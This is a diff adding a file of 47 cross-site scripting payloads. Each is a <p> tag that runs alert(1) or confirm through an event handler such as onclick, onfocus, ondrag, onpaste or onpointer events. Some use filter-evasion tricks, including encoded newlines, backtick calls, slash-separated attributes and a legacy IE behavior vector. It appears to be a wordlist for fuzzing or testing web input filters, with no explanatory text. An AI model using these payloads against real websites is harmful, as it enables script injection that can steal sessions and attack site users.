@@ -1,0 +1,47 @@
+<p onbeforescriptexecute="alert(1)"><svg><script>\</p>
+“><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
+<p draggable="true" ondrag="alert(1)">test</p>
+<p draggable="true" ondragend="alert(1)">test</p>
+<p draggable="true" ondragenter="alert(1)">test</p>
+<p draggable="true" ondragleave="alert(1)">test</p>
+<p draggable="true" ondragstart="alert(1)">test</p>
+<p id=x tabindex=1 onactivate=alert(1)></p>
+<p id=x tabindex=1 onbeforeactivate=alert(1)></p>
+<p id=x tabindex=1 onbeforedeactivate=alert(1)></p><input autofocus>
+<p id=x tabindex=1 ondeactivate=alert(1)></p><input id=y autofocus>
+<p id=x tabindex=1 onfocus=alert(1)></p>
+<p id=x tabindex=1 onfocusin=alert(1)></p>
+<p onafterscriptexecute=alert(1)><script>1</script>
+<p onbeforecopy="alert(1)" contenteditable>test</p>
+<p onbeforecut="alert(1)" contenteditable>test</p>
+<p onbeforepaste="alert(1)" contenteditable>test</p>
+<p onbeforescriptexecute=alert(1)><script>1</script>
+<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>
+<p onclick="alert(1)">test</p>
+<p oncontextmenu="alert(1)">test</p>
+<p oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<p oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<p ondblclick="alert(1)" autofocus tabindex=1>test</p>
+<p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>
+<p onkeydown="alert(1)" contenteditable>test</p>
+<p onkeypress="alert(1)" contenteditable>test</p>
+<p onkeyup="alert(1)" contenteditable>test</p>
+<p onmousedown="alert(1)">test</p>
+<p onmouseenter="alert(1)">test</p>
+<p onmouseleave="alert(1)">test</p>
+<p onmousemove="alert(1)">test</p>
+<p onmouseout="alert(1)">test</p>
+<p onmouseover="alert(1)">test</p>
+<p onmouseup="alert(1)">test</p>
+<p onmousewheel=alert(1)>requires scrolling
+<p onpaste="alert(1)" contenteditable>test</p>
+<p onpointerdown=alert(1)>XSS</p>
+<p onpointerenter=alert(1)>XSS</p>
+<p onpointerleave=alert(1)>XSS</p>
+<p onpointermove=alert(1)>XSS</p>
+<p onpointerout=alert(1)>XSS</p>
+<p onpointerover=alert(1)>XSS</p>
+<p onpointerrawupdate=alert(1)>XSS</p>
+<p onpointerup=alert(1)>XSS</p>
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
+<p/onclick=alert(/INJECTX/)>a
